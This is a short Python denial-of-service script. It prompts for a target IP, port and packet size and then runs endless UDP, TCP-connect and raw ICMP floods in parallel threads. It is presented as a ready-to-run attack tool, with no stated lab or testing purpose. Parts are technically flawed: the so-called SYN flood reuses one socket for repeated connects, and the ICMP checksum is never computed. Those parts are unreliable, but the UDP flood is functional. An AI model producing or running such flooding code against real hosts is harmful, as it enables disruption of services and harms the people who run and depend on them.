import socket
import threading
import os
import struct

# ICMP packet header fields
ICMP_ECHO_REQUEST = 8
ICMP_CODE = socket.getprotobyname('icmp')

def send_udp_packets(target_ip, target_port, packet_size):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp_packet_data = b'A' * packet_size

    while True:
        udp_socket.sendto(udp_packet_data, (target_ip, target_port))

def send_tcp_syn_packets(target_ip, target_port):
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    while True:
        tcp_socket.connect((target_ip, target_port))

def send_icmp_packets(target_ip):
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
    icmp_packet_data = b'A' * 64  # ICMP packet payload

    # ICMP echo request packet structure
    icmp_packet = struct.pack("BBHHH", ICMP_ECHO_REQUEST, 0, 0, os.getpid() & 0xFFFF, 1) + icmp_packet_data

    while True:
        icmp_socket.sendto(icmp_packet, (target_ip, 1))  # Send ICMP echo request

# Prompt the user for target IP address, port, and packet size
target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))
packet_size = int(input("Enter the packet size (in bytes): "))

# Create and start the UDP packet sending thread
udp_thread = threading.Thread(target=send_udp_packets, args=(target_ip, target_port, packet_size))
udp_thread.start()

# Create and start the TCP SYN packet sending thread
tcp_thread = threading.Thread(target=send_tcp_syn_packets, args=(target_ip, target_port))
tcp_thread.start()

# Create and start the ICMP packet sending thread
icmp_thread = threading.Thread(target=send_icmp_packets, args=(target_ip,))
icmp_thread.start()
